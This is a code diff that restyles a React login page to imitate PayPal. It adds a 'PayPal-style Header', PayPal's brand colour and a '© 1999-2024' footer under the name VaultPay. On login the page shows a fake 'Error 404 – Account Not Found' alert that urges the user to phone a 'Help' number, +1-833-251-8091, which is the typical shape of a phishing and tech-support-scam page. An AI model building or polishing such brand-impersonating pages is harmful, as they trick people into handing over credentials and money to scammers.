@@ -1,9 +1,4 @@
 import { useState } from "react";
-import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
-import { Label } from "@/components/ui/label";
-import { Card, CardContent, CardHeader } from "@/components/ui/card";
-import { Separator } from "@/components/ui/separator";
 import { Alert, AlertDescription } from "@/components/ui/alert";
 import { AlertTriangle } from "lucide-react";
 
@@ -18,135 +13,134 @@ export default function Index() {
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white">
-      {/* Header */}
-      <header className="border-b bg-white shadow-sm">
-        <div className="container mx-auto px-4 py-4">
+    <div className="min-h-screen bg-white">
+      {/* PayPal-style Header */}
+      <header className="bg-white border-b border-gray-200 py-4">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
           <div className="flex items-center justify-between">
-            <div className="flex items-center space-x-3">
-              <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
-                <span className="text-white font-bold text-sm">FT</span>
+            <div className="flex items-center">
+              <div className="text-2xl font-bold text-[#0070ba] tracking-tight">
+                VaultPay
               </div>
-              <span className="text-xl font-semibold text-gray-800">FineTech</span>
             </div>
-            <nav className="hidden md:flex items-center space-x-6">
-              <a href="#" className="text-gray-600 hover:text-blue-600 transition-colors">Personal</a>
-              <a href="#" className="text-gray-600 hover:text-blue-600 transition-colors">Business</a>
-              <a href="#" className="text-gray-600 hover:text-blue-600 transition-colors">Help</a>
-            </nav>
+            <div className="hidden sm:flex items-center space-x-6">
+              <a href="#" className="text-[#0070ba] hover:text-[#005ea6] text-sm font-medium">Help</a>
+            </div>
           </div>
         </div>
       </header>
 
       {/* Main Content */}
-      <main className="container mx-auto px-4 py-12">
-        <div className="max-w-md mx-auto">
+      <main className="flex-1 flex items-center justify-center px-4 sm:px-6 lg:px-8 py-12">
+        <div className="max-w-md w-full space-y-8">
           {/* Logo and Title */}
-          <div className="text-center mb-8">
-            <div className="w-16 h-16 bg-blue-600 rounded-xl flex items-center justify-center mx-auto mb-4">
-              <span className="text-white font-bold text-xl">FT</span>
-            </div>
-            <h1 className="text-2xl font-semibold text-gray-800 mb-2">Log in to your account</h1>
-            <p className="text-gray-600">Enter your email and password to continue</p>
+          <div className="text-center">
+            <h2 className="text-3xl font-normal text-gray-900 mb-2">
+              Log in to your account
+            </h2>
           </div>
 
           {/* Error Alert */}
           {showError && (
-            <Alert className="mb-6 border-red-200 bg-red-50">
-              <AlertTriangle className="h-4 w-4 text-red-600" />
-              <AlertDescription className="text-red-800">
-                <div className="font-medium mb-1">❌ Error 404 – Account Not Found</div>
-                <div className="mb-2">We couldn't find an account matching your information.</div>
-                <div className="mb-2">Please verify your login details.</div>
-                <div className="text-sm">For assistance, contact Help: +1-833-251-8091</div>
-              </AlertDescription>
-            </Alert>
+            <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
+              <div className="flex">
+                <AlertTriangle className="h-5 w-5 text-red-600 flex-shrink-0 mt-0.5" />
+                <div className="ml-3">
+                  <div className="text-sm font-medium text-red-800 mb-1">
+                    ❌ Error 404 – Account Not Found
+                  </div>
+                  <div className="text-sm text-red-700 mb-2">
+                    We couldn't find an account matching your information.
+                  </div>
+                  <div className="text-sm text-red-700 mb-2">
+                    Please verify your login details.
+                  </div>
+                  <div className="text-sm text-red-700">
+                    For assistance, contact Help: +1-833-251-8091
+                  </div>
+                </div>
+              </div>
+            </div>
           )}
 
           {/* Login Form */}
-          <Card className="shadow-lg border-0">
-            <CardHeader className="pb-4">
-              <div className="text-center">
-                <p className="text-sm text-gray-600">Welcome back</p>
-              </div>
-            </CardHeader>
-            <CardContent className="space-y-6">
-              <form onSubmit={handleLogin} className="space-y-4">
-                <div className="space-y-2">
-                  <Label htmlFor="email" className="text-sm font-medium text-gray-700">Email address</Label>
-                  <Input
-                    id="email"
-                    type="email"
-                    value={email}
-                    onChange={(e) => setEmail(e.target.value)}
-                    placeholder="Enter your email"
-                    className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-500"
-                    required
-                  />
-                </div>
-                
-                <div className="space-y-2">
-                  <Label htmlFor="password" className="text-sm font-medium text-gray-700">Password</Label>
-                  <Input
-                    id="password"
-                    type="password"
-                    value={password}
-                    onChange={(e) => setPassword(e.target.value)}
-                    placeholder="Enter your password"
-                    className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-500"
-                    required
-                  />
-                </div>
-
-                <Button 
-                  type="submit" 
-                  className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg transition-colors"
-                >
-                  Log In
-                </Button>
-              </form>
-
-              <div className="text-center">
-                <a href="#" className="text-sm text-blue-600 hover:text-blue-700 transition-colors">
-                  Forgot your password?
-                </a>
+          <div className="bg-white rounded-lg border border-gray-300 shadow-sm p-8">
+            <form onSubmit={handleLogin} className="space-y-6">
+              <div>
+                <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-2">
+                  Email or mobile number
+                </label>
+                <input
+                  id="email"
+                  type="email"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  className="w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#0070ba] focus:border-[#0070ba] text-base"
+                  required
+                />
               </div>
 
-              <Separator />
+              <div>
+                <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
+                  Password
+                </label>
+                <input
+                  id="password"
+                  type="password"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  className="w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#0070ba] focus:border-[#0070ba] text-base"
+                  required
+                />
+              </div>
 
-              <div className="text-center space-y-4">
-                <p className="text-sm text-gray-600">Don't have an account?</p>
-                <Button 
-                  variant="outline" 
-                  className="w-full h-12 border-blue-600 text-blue-600 hover:bg-blue-50 font-medium rounded-lg transition-colors"
-                >
+              <button
+                type="submit"
+                className="w-full bg-[#0070ba] hover:bg-[#005ea6] text-white font-medium py-3 px-4 rounded-md transition-colors duration-200 text-base"
+              >
+                Log In
+              </button>
+            </form>
+
+            <div className="mt-6 text-center">
+              <a href="#" className="text-[#0070ba] hover:text-[#005ea6] text-sm font-medium">
+                Forgot password?
+              </a>
+            </div>
+
+            <div className="mt-8 pt-6 border-t border-gray-200">
+              <div className="text-center">
+                <p className="text-sm text-gray-600 mb-4">Don't have an account?</p>
+                <button className="w-full border-2 border-[#0070ba] text-[#0070ba] hover:border-[#005ea6] hover:text-[#005ea6] font-medium py-3 px-4 rounded-md transition-colors duration-200 text-base">
                   Sign Up
-                </Button>
+                </button>
               </div>
-            </CardContent>
-          </Card>
+            </div>
+          </div>
 
           {/* Security Notice */}
-          <div className="mt-8 text-center">
-            <p className="text-xs text-gray-500">
-              Your information is secure and encrypted. We use industry-standard security measures to protect your data.
+          <div className="text-center">
+            <p className="text-xs text-gray-500 leading-relaxed">
+              We use cookies to improve your experience on our site. By agreeing to use our site,
+              you consent to our use of cookies. To learn more, including how to change your settings,
+              see our <a href="#" className="text-[#0070ba] hover:underline">Cookie Policy</a>.
             </p>
           </div>
         </div>
       </main>
 
       {/* Footer */}
-      <footer className="border-t bg-gray-50 mt-16">
-        <div className="container mx-auto px-4 py-8">
-          <div className="text-center space-y-4">
-            <div className="flex justify-center space-x-6 text-sm text-gray-600">
-              <a href="#" className="hover:text-blue-600 transition-colors">Privacy Policy</a>
-              <a href="#" className="hover:text-blue-600 transition-colors">Terms of Service</a>
-              <a href="#" className="hover:text-blue-600 transition-colors">Contact Us</a>
-              <a href="#" className="hover:text-blue-600 transition-colors">Security Center</a>
-            </div>
+      <footer className="bg-gray-50 border-t border-gray-200">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+          <div className="flex flex-wrap justify-center items-center space-x-6 text-sm text-gray-600">
+            <a href="#" className="hover:text-[#0070ba] transition-colors">Contact Us</a>
+            <a href="#" className="hover:text-[#0070ba] transition-colors">Privacy</a>
+            <a href="#" className="hover:text-[#0070ba] transition-colors">Legal</a>
+            <a href="#" className="hover:text-[#0070ba] transition-colors">Worldwide</a>
+          </div>
+          <div className="mt-4 text-center">
             <p className="text-xs text-gray-500">
-              © 2024 FineTech. All rights reserved. Licensed and regulated financial services provider.
+              © 1999-2024 VaultPay, Inc. All rights reserved.
             </p>
           </div>
         </div>
